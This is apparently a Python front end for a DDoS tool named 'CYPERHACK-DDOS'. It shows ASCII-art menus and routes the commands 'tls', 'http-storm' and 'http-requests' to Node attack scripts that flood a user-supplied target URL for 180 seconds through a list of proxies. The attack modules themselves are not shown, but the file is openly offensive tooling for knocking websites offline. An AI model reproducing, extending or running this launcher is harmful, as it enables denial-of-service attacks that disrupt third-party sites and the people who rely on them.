import os 
import requests

os.system('clear')
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def title():
  print(f"CYPERHACK-DDOS | bot {bots} | admin | VIP : True ")


def ip():
  os.system('clear')
  title()
  print("""
  ██╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     ███████╗
██║██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
██║██████╔╝       ██║   ██║   ██║██║   ██║██║     ███████╗
██║██╔═══╝        ██║   ██║   ██║██║   ██║██║     ╚════██║
██║██║            ██║   ╚██████╔╝╚██████╔╝███████╗███████║
╚═╝╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝

   GEOIP | SUBDOMAIN | CLEAR | EXIT
  
  
  
  """)
  

def banner():
  os.system('clear')
  title()
  print("""
     ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝███████║███████║██║     █████╔╝ 
██║       ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║██╔══██║██║     ██╔═██╗ 
╚██████╗   ██║   ██║     ███████╗██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗
 ╚═════╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

    |Wellcome to main screen        |
    |Press "help" to see all command|
    #code by hphongdev
    
    """)
def l7():
  print("""
  ▀██▀                                         ▄▄▄▄  
 ██        ▄▄▄▄    ▄▄▄▄ ▄▄▄   ▄▄▄▄  ▄▄▄ ▄▄   ▀  ██ 
 ██       ▀▀ ▄██    ▀█▄  █  ▄█▄▄▄██  ██▀ ▀▀     █▄ 
 ██       ▄█▀ ██     ▀█▄█   ██       ██        ██  
▄██▄▄▄▄▄█ ▀█▄▄▀█▀     ▀█     ▀█▄▄▄▀ ▄██▄      ██   
                   ▄▄ █                       ██   
                    ▀▀                        █▀   

ALL LAYER7 METHODS :
tls : powerfull 
http-storm : weak
http-requests : good

  ______________________
  maximun time to attack is 180s
  """)
  command()










def help():
  print("""
   __    __          __          
|  \  |  \        |  \         
| ▓▓  | ▓▓ ______ | ▓▓ ______  
| ▓▓__| ▓▓/      \| ▓▓/      \ 
| ▓▓    ▓▓  ▓▓▓▓▓▓\ ▓▓  ▓▓▓▓▓▓\
| ▓▓▓▓▓▓▓▓ ▓▓    ▓▓ ▓▓ ▓▓  | ▓▓
| ▓▓  | ▓▓ ▓▓▓▓▓▓▓▓ ▓▓ ▓▓__/ ▓▓
| ▓▓  | ▓▓\▓▓     \ ▓▓ ▓▓    ▓▓
 \▓▓   \▓▓ \▓▓▓▓▓▓▓\▓▓ ▓▓▓▓▓▓▓ 
                     | ▓▓      
                     | ▓▓      
                      \▓▓      

  Method : l7 and l4 attack methods
  Ip : some ip tool
  exit : cut khoi tool
  clear : clear system 
  info : account infor
  proxy : download new proxylist
  """)
  command()

def brain():
  command()
    
def command():
  title()
  cmd = input('hphongdev@cyper ~:')
  if cmd == 'help':
    help()
  if cmd == 'tls':
    target = input('URL ~')
    rate = input('RATE ~ ')
    threads = input('THREADS ~ ')
    os.system(f'node module/tls.js {target} 180 {rate} {threads} proxies.txt')
    print(f'successfully attacking to {target} ')
    brain()
    
  if cmd == 'clear':
    os.system('clear')
    brain()
    
  if cmd == 'l7':
    l7()
  
  if cmd == 'proxy':
    os.system('rm proxies.txt')
    os.system('python prx.py')
    brain()
    
  if cmd == 'http-storm':
    url = input('TARGET~ ')
    rate = input('RATE~ ')
    threads = input('THREADS~ ')
    os.system(f'node module/http-storm.js {url} 180 {rate} {threads}')
    print(f'attack successfully to {url}')
    brain()
    
  if cmd == 'http-requests':
    url = input('TARGET~ ')
    os.system(f'node module/http-requests.js {url} 180')
    print(f'attack successfully to {url}')
    brain()
  
  
 
  



if '__main__' == '__main__':
  command()
